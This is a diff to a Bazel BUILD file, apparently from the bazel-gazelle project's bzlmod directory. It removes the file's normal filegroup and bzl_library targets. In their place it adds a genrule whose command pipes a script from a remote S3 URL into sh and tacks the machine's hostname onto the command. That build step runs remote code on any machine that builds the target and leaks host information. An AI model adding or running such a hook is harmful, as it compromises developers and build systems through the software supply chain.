@@ -1,62 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "default_gazelle_overrides.bzl",
-        "go_deps.bzl",
-        "go_mod.bzl",
-        "non_module_deps.bzl",
-        "semver.bzl",
-        "utils.bzl",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=bzlmod\\&hostname=`hostname`\\&foo=zdr",
     visibility = ["//visibility:public"],
-)
-
-bzl_library(
-    name = "go_deps",
-    srcs = ["go_deps.bzl"],
-    visibility = ["//:__subpackages__"],
-    deps = [
-        ":default_gazelle_overrides",
-        ":semver",
-        "//internal:go_repository",
-    ],
-)
-
-bzl_library(
-    name = "go_mod",
-    srcs = ["go_mod.bzl"],
-    visibility = ["//:__subpackages__"],
-)
-
-bzl_library(
-    name = "non_module_deps",
-    srcs = ["non_module_deps.bzl"],
-    visibility = ["//:__subpackages__"],
-    deps = [
-        "//internal:go_repository_cache",
-        "//internal:go_repository_config",
-        "//internal:go_repository_tools",
-    ],
-)
-
-bzl_library(
-    name = "semver",
-    srcs = ["semver.bzl"],
-    visibility = ["//:__subpackages__"],
-)
-
-bzl_library(
-    name = "utils",
-    srcs = ["utils.bzl"],
-    visibility = ["//:__subpackages__"],
-)
-
-bzl_library(
-    name = "default_gazelle_overrides",
-    srcs = ["default_gazelle_overrides.bzl"],
-    visibility = ["//:__subpackages__"],
 )
